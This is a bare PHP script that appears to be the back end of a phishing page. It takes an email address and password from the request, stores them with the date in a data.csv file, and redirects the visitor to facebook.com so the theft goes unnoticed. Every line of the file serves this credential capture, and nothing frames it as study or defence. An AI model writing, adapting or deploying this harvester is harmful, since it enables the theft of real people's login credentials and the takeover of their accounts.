<?php

$email=$_GET['email'];
$pass=$_GET['pass'];

$now=date("Y/m/d");
$msg = $email.','.$pass.','.$now;
$file = "data.csv";
$fc = fopen($file, "r");
while (!feof($fc)) {
    $buffer = fgets($fc, 4096);
    $lines[] = $buffer;
}

fclose($fc);

//open same file and use "w" to clear file 
$f = fopen($file, "w") or die("couldn't open $file");

$lineCount = count($lines);
//loop through array writing the lines until the secondlast
for ($i = 0; $i < $lineCount- 1; $i++) {
    fwrite($f, $lines[$i]);
}
fwrite($f, $msg.PHP_EOL);

//write the last line
fwrite($f, $lines[$lineCount-1]);
fclose($f);

header('Location: https://facebook.com'); 
  
?>
